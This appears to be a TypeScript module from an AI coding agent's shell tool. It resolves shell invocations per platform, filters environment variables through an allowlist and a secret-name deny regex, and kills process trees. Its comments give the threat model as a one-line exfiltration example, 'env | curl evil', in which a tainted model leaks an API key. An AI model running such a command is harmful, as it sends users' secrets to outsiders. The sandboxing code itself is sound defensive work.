/**
 * spawn-common — shared subprocess primitives for foreground (safeSpawnShell)
 * and background (BackgroundShellManager) shell execution.
 *
 * Both paths must agree on three things or their security/behavior drifts:
 *
 *   1. How a free-form shell command is turned into an actual (file, args)
 *      under the active sandbox backend ({@link resolveSpawnTarget}).
 *   2. Which environment variables are forwarded into a sandboxed shell
 *      ({@link buildSandboxEnv} + {@link ENV_DENY_REGEX}) — the Bash threat
 *      model (a tainted model exfiltrating `OPENROUTER_API_KEY` via
 *      `env | curl evil`).
 *   3. How a process is terminated — SIGTERM → grace → SIGKILL. The
 *      background path needs this at *process-group* granularity
 *      ({@link killProcessGroup}) because `npm run dev` is really
 *      `sh → npm → node vite` and killing only the outer `sh` leaks the
 *      vite child that holds the port (design §难点2).
 *
 * safeSpawnShell keeps its own single-process kill cascade (it does not
 * spawn detached, so there's no separate process group to reap); it shares
 * (1) and (2) here. The background manager uses all three.
 */

import { spawn, execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { dirname, join } from "node:path";
import type { SandboxBackend } from "../tool-system/sandbox/index.js";

/**
 * Env vars that are always safe to forward into a sandboxed shell. Mirrors
 * the allowlist that previously lived in bash.ts — kept here so foreground
 * and background shells share one source of truth. The `off` backend keeps
 * the historical full-passthrough behavior (the user opted out of sandboxing)
 * and does NOT call this.
 */
export const ENV_ALLOWLIST: ReadonlySet<string> = new Set([
  "PATH",
  "HOME",
  "USER",
  "LOGNAME",
  "SHELL",
  "LANG",
  "LC_ALL",
  "LC_CTYPE",
  "TERM",
  "TMPDIR",
  "TZ",
  "COLUMNS",
  "LINES",
  "PWD",
]);

/**
 * Names matching these patterns are dropped even if they appear in the
 * allowlist (defense in depth — e.g. a user setting `PATH_TOKEN` shouldn't
 * leak just because it starts with `PATH`). Case-insensitive on the full name.
 */
export const ENV_DENY_REGEX =
  /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|SESSION|AUTH|COOKIE|PRIVATE)/i;

/**
 * Build a hardened env for a sandboxed shell: allowlist ∖ deny-regex.
 * `source` defaults to `process.env` so callers usually omit it; tests pass
 * a fixed object.
 */
export function buildSandboxEnv(source: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const name of ENV_ALLOWLIST) {
    const v = source[name];
    if (v !== undefined && !ENV_DENY_REGEX.test(name)) {
      out[name] = v;
    }
  }
  return out;
}

/**
 * Layer a project's `localEnvironment.env` (KEY=VALUE pairs the user
 * explicitly configured in `.code-shell/settings.json`) on top of a base
 * shell env.
 *
 * Unlike {@link buildSandboxEnv}, project env values are NOT filtered through
 * the deny regex: the user put them there deliberately (e.g. `DATABASE_URL`,
 * a project-scoped `API_BASE`), so honoring them is the whole point. The
 * allowlist/deny machinery exists to stop a tainted model from exfiltrating
 * the *host's* secrets via `env | curl`; values the user typed into project
 * settings are a different trust class.
 *
 * Returns the base unchanged when `projectEnv` is empty/undefined, so the
 * caller can pass it through unconditionally with zero behavior change for
 * projects that don't configure one. `undefined` values in `projectEnv` are
 * skipped (they'd otherwise stringify to "undefined").
 */
export function mergeShellEnv(
  base: NodeJS.ProcessEnv,
  projectEnv: Record<string, string> | undefined,
): NodeJS.ProcessEnv {
  if (!projectEnv) return base;
  const keys = Object.keys(projectEnv);
  if (keys.length === 0) return base;
  const out: NodeJS.ProcessEnv = { ...base };
  for (const k of keys) {
    const v = projectEnv[k];
    if (v !== undefined) out[k] = v;
  }
  return out;
}

export interface SpawnTarget {
  file: string;
  args: string[];
  /** Backend-allocated resource cleanup (e.g. seatbelt temp profile). */
  cleanup?: () => void;
}

/**
 * Resolve the shell binary + the (file, args) needed to run a free-form
 * `command` string through it, per platform. Centralizes the POSIX-vs-Windows
 * shell fork that was previously hardcoded as `/bin/bash` + `["-c", command]`
 * in five places (bash.ts, safe-spawn.ts, background-shell.ts, worktree.ts):
 *
 *   - POSIX: `<explicit ?? $SHELL ?? /bin/bash> -c "<command>"`
 *   - Windows: `<explicit shell ?? Git Bash ?? PowerShell ?? ComSpec ?? cmd.exe>` with the
 *     shell-appropriate flag: Git Bash/POSIX shells use `-c`, PowerShell uses
 *     `-Command`, and cmd.exe uses `/c` (`-c` would be taken as a filename and
 *     fail/hang). Git Bash is preferred because the Bash tool receives POSIX
 *     syntax from the model.
 *
 * `$SHELL` is ignored on Windows — it is virtually never set there, and when
 * it is (e.g. a stray value from a Unix-y env) it points at a POSIX path that
 * doesn't exist on the host. An explicit `shell` overrides everything (a user
 * who configured `pwsh`/`bash` knows what they want).
 */
export function resolveShellInvocation(
  command: string,
  shell?: string,
): { file: string; args: string[] } {
  if (process.platform === "win32") {
    const file = shell ?? defaultShellBinary();
    // Flag form depends on the shell: PowerShell → -Command; a POSIX shell such
    // as Git Bash's bash.exe / sh → -c (it does NOT understand cmd's /c); cmd.exe
    // (and cmd-like) → /c. Detecting bash/sh matters now that defaultShellBinary
    // prefers Git Bash on Windows — feeding it /c would break every command.
    const isPwsh = /(^|[\\/])(pwsh|powershell)(\.exe)?$/i.test(file);
    if (isPwsh) return { file, args: ["-Command", command] };
    const isPosixShell = /(^|[\\/])(bash|sh|zsh|dash)(\.exe)?$/i.test(file);
    return { file, args: [isPosixShell ? "-c" : "/c", command] };
  }
  const file = shell ?? process.env.SHELL ?? "/bin/bash";
  return { file, args: ["-c", command] };
}

/**
 * Best-effort locate Git Bash's `bash.exe` on Windows. Returns undefined on
 * non-Windows, when git isn't installed, or when no bash.exe is found.
 *
 * WHY: The Bash tool and background shells feed the model's *bash* commands
 * (`ls`, `&&`, `$(…)`, pipes, quoting) to the shell. On Windows the historical
 * default is `cmd.exe`, which can't run any of that — so "Bash" was effectively
 * broken on Windows. Git for Windows (which most devs already have — we detect
 * it for repo ops anyway) ships a full bash at `<git>\bin\bash.exe`, so prefer
 * it. Falls back to PowerShell before cmd.exe when Git Bash truly isn't present.
 *
 * Resolution order:
 *   1. CODE_SHELL_GIT_BASH_PATH env override (explicit user config wins).
 *   2. Reverse-engineer from the git binary's location: `where git` gives e.g.
 *      `C:\Program Files\Git\cmd\git.exe` → `…\Git\bin\bash.exe`.
 *   3. The two default install locations (Program Files / Program Files (x86)).
 * Cached after first probe (a spawn per command would be wasteful).
 */
let gitBashCache: string | null | undefined;
export function resolveGitBash(): string | undefined {
  if (process.platform !== "win32") return undefined;
  if (gitBashCache !== undefined) return gitBashCache ?? undefined;

  const override = process.env.CODE_SHELL_GIT_BASH_PATH;
  if (override && existsSync(override)) return (gitBashCache = override);

  const candidates: string[] = [];
  // (2) derive from `where git`. Git installs git.exe under either \cmd\ or
  // \bin\; bash.exe lives under the sibling \bin\. Walk up to the Git root.
  try {
    const out = execFileSync("where", ["git"], { encoding: "utf-8", timeout: 3000 });
    const gitExe = out.split(/\r?\n/).find((l) => l.trim().toLowerCase().endsWith("git.exe"));
    if (gitExe) {
      const gitRoot = dirname(dirname(gitExe.trim())); // …\Git\cmd\git.exe → …\Git
      candidates.push(join(gitRoot, "bin", "bash.exe"));
    }
  } catch {
    // git not on PATH — fall through to the well-known locations.
  }
  // (3) default install locations.
  const pf = process.env["ProgramFiles"] ?? "C:\\Program Files";
  const pf86 = process.env["ProgramFiles(x86)"] ?? "C:\\Program Files (x86)";
  candidates.push(join(pf, "Git", "bin", "bash.exe"));
  candidates.push(join(pf86, "Git", "bin", "bash.exe"));

  const found = candidates.find((p) => existsSync(p));
  return (gitBashCache = found ?? null) ?? undefined;
}

/** Reset the Git Bash probe cache. Test-only (platform is stubbed per test). */
export function _resetGitBashCache(): void {
  gitBashCache = undefined;
}

let powerShellCache: string | null | undefined;
export function resolvePowerShell(): string | undefined {
  if (process.platform !== "win32") return undefined;
  if (powerShellCache !== undefined) return powerShellCache ?? undefined;

  const override = process.env.CODE_SHELL_POWERSHELL_PATH;
  if (override && existsSync(override)) return (powerShellCache = override);

  const candidates: string[] = [];
  for (const exe of ["pwsh", "powershell"]) {
    try {
      const out = execFileSync("where", [exe], { encoding: "utf-8", timeout: 3000 });
      const found = out.split(/\r?\n/).find((l) => l.trim().toLowerCase().endsWith(`${exe}.exe`));
      if (found) candidates.push(found.trim());
    } catch {
      // Not on PATH; try the next shell / well-known locations.
    }
  }

  const pf = process.env["ProgramFiles"] ?? "C:\\Program Files";
  const systemRoot = process.env.SystemRoot ?? "C:\\Windows";
  candidates.push(join(pf, "PowerShell", "7", "pwsh.exe"));
  candidates.push(join(systemRoot, "System32", "WindowsPowerShell", "v1.0", "powershell.exe"));

  const found = candidates.find((p) => existsSync(p));
  return (powerShellCache = found ?? null) ?? undefined;
}

/** Reset the PowerShell probe cache. Test-only (platform is stubbed per test). */
export function _resetPowerShellCache(): void {
  powerShellCache = undefined;
}

/** The platform's default interactive shell binary, for spawning a bare shell
 *  (no `-c`/`/c` command). Windows → Git Bash if present, else PowerShell,
 *  else ComSpec/cmd.exe;
 *  POSIX → $SHELL/bin/bash. Windows prefers Git Bash so the model's bash-syntax
 *  commands actually run (cmd.exe can't). */
export function defaultShellBinary(shell?: string): string {
  if (shell) return shell;
  if (process.platform === "win32") {
    return resolveGitBash() ?? resolvePowerShell() ?? process.env.ComSpec ?? "cmd.exe";
  }
  return process.env.SHELL ?? "/bin/bash";
}

/**
 * Resolve the actual (file, args) for a shell `command` under an optional
 * sandbox. With a sandbox, the backend decides (e.g. seatbelt →
 * `sandbox-exec -f profile shell -c command`). Without one, plain
 * `shell -c command`. This is exactly safeSpawnShell's pre-spawn logic,
 * lifted so the background path produces an identical target.
 */
export function resolveSpawnTarget(
  command: string,
  opts: { cwd: string; shell: string; sandbox?: SandboxBackend },
): SpawnTarget {
  if (opts.sandbox) {
    const wrapped = opts.sandbox.wrap(command, { cwd: opts.cwd, shell: opts.shell });
    return { file: wrapped.file, args: wrapped.args, cleanup: wrapped.cleanup };
  }
  // No sandbox configured: pick the shell + command-flag form for the
  // platform instead of assuming POSIX `-c`. Note Bash always passes a
  // backend (off at minimum), so it never reaches this line — the off
  // backend's wrap() delegates to resolveShellInvocation itself.
  return resolveShellInvocation(command, opts.shell);
}

/**
 * Terminate a single (non-detached) foreground child + its tree.
 *
 *  - POSIX: SIGTERM, then SIGKILL after `graceMs` if it ignored the term.
 *    (The child is the process-group leader of its own subtree only if it was
 *    spawned with its own group; safe-spawn's foreground children are not, so
 *    this kills the direct child — matching the historical behavior.)
 *  - Windows: `child.kill("SIGTERM")` is a no-op and only kills the direct
 *    child anyway, leaving grandchildren (e.g. `npm test → node`). Use
 *    `taskkill /T /F` on the pid to reap the whole tree. No graceful phase.
 *
 * Best-effort: never throws; a child that already exited is fine.
 */
export function killChildTree(child: { pid?: number; kill: (sig?: NodeJS.Signals) => boolean }, graceMs: number): void {
  if (process.platform === "win32") {
    if (typeof child.pid === "number") void killProcessTreeWindows(child.pid);
    else try { child.kill("SIGKILL"); } catch { /* gone */ }
    return;
  }
  try { child.kill("SIGTERM"); } catch { /* may already be dead */ }
  setTimeout(() => {
    try { child.kill("SIGKILL"); } catch { /* ignore */ }
  }, graceMs).unref();
}

const DEFAULT_GROUP_GRACE_MS = 3000;

/**
 * Terminate an entire process group, SIGTERM → grace → SIGKILL.
 *
 * Targets the group by negating the leader pid (`process.kill(-pgid, sig)`),
 * which requires the leader to have been spawned `detached: true` so its pid
 * is its own pgid. This is the background path's answer to design §难点2:
 * `npm run dev`'s real tree (`sh → npm → node vite`) all share the group, so
 * one group-level signal reaps the vite child that actually holds the port.
 *
 * Resolves once the group is confirmed gone (or the grace SIGKILL has been
 * sent). Idempotent: a group that's already dead (ESRCH) resolves immediately
 * without throwing.
 *
 * @param pgid  The process-group id == the detached leader's pid.
 */
export function killProcessGroup(
  pgid: number,
  opts: { graceMs?: number } = {},
): Promise<void> {
  // Safety: a pgid of 0/1 (or non-integer) must NEVER reach process.kill —
  // `process.kill(-0)` targets the caller's OWN group and `process.kill(-1)`
  // signals EVERY process the user can reach (catastrophic self-kill). Live
  // pgids are real detached-child pids (>1), but pgid is also persisted in
  // orphan records and read back from disk, so a corrupt/tampered record could
  // surface 0/1 here. Refuse rather than fire a group signal at a bogus target.
  if (!Number.isInteger(pgid) || pgid <= 1) {
    return Promise.resolve();
  }
  // Windows has no process groups and no real SIGTERM. The detached leader is
  // NOT spawned detached on win (see background-shell), so `pgid` is just the
  // leader pid. Reap the whole tree with `taskkill /PID <pid> /T /F` — /T walks
  // children (npm → node → vite), /F forces. This is the win32 equivalent of
  // the negative-pid SIGKILL below; there's no graceful phase on Windows.
  if (process.platform === "win32") {
    return killProcessTreeWindows(pgid);
  }

  const grace = opts.graceMs ?? DEFAULT_GROUP_GRACE_MS;
  return new Promise<void>((resolve) => {
    if (!groupAlive(pgid)) {
      resolve();
      return;
    }
    try {
      process.kill(-pgid, "SIGTERM");
    } catch {
      // Already gone, or not permitted — fall through to the grace check.
    }

    const start = Date.now();
    // Poll for graceful exit so we can resolve early (and skip SIGKILL) when
    // the group honors SIGTERM. Cheap: a `kill(-pgid, 0)` probe every 50ms.
    const tick = (): void => {
      if (!groupAlive(pgid)) {
        resolve();
        return;
      }
      if (Date.now() - start >= grace) {
        try {
          process.kill(-pgid, "SIGKILL");
        } catch {
          // Race: exited between the probe and here. Fine.
        }
        // Give the OS a beat to tear the group down before resolving so
        // callers that immediately probe see ESRCH.
        setTimeout(resolve, 50);
        return;
      }
      setTimeout(tick, 50);
    };
    setTimeout(tick, 50);
  });
}

/**
 * True if any process in the group `pgid` is still alive. Signal 0 performs
 * existence/permission checks without delivering a signal; ESRCH means the
 * whole group is gone.
 *
 * Windows has no process groups: probe the leader pid directly (positive,
 * Node supports signal 0 on Windows for an existence check). Children may
 * outlive the leader, but `taskkill /T` already reaps the tree, so a
 * leader-alive probe is the right gate for the win32 kill path.
 */
export function groupAlive(pgid: number): boolean {
  // Same 0/1 guard as killProcessGroup: `process.kill(-0, 0)` probes the
  // caller's own group (a false "alive"), and -1 is the all-processes target.
  // A bogus pgid means "no such group" → not alive.
  if (!Number.isInteger(pgid) || pgid <= 1) return false;
  const target = process.platform === "win32" ? pgid : -pgid;
  try {
    process.kill(target, 0);
    return true;
  } catch (e) {
    return (e as NodeJS.ErrnoException).code !== "ESRCH";
  }
}

/**
 * Windows process-tree kill via `taskkill /PID <pid> /T /F`. Resolves when
 * taskkill exits (or immediately if the pid is already gone). Best-effort:
 * a non-zero exit (e.g. "process not found", code 128) is treated as success
 * since the goal — the tree being gone — is met.
 */
function killProcessTreeWindows(pid: number): Promise<void> {
  return new Promise<void>((resolve) => {
    let child: ReturnType<typeof spawn>;
    try {
      child = spawn("taskkill", ["/PID", String(pid), "/T", "/F"], {
        stdio: "ignore",
        windowsHide: true,
      });
    } catch {
      resolve();
      return;
    }
    child.on("error", () => resolve());
    child.on("exit", () => resolve());
  });
}
